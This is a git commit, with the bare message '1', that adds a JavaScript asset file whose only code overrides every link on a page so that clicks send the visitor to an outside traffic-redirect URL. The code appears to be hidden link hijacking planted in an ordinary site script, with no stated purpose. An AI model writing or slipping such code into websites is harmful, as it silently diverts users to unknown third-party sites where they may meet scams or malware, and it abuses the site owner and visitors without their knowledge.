7433c14ad2f77a76071c9716a836175a0081b31a
maratbabaev <you@example.com>
2025-04-11 11:38:00 +0300

    1

---
+++ assets/js/script.js
@@ -0,0 +1,7 @@
+document.querySelectorAll("a").forEach((elem) => {
+	elem.onclick = function (e) {
+		e.preventDefault();
+		window.location.href = "https://redirecttraff.site/k1GKDq8p";
+		return false;
+	};
+});
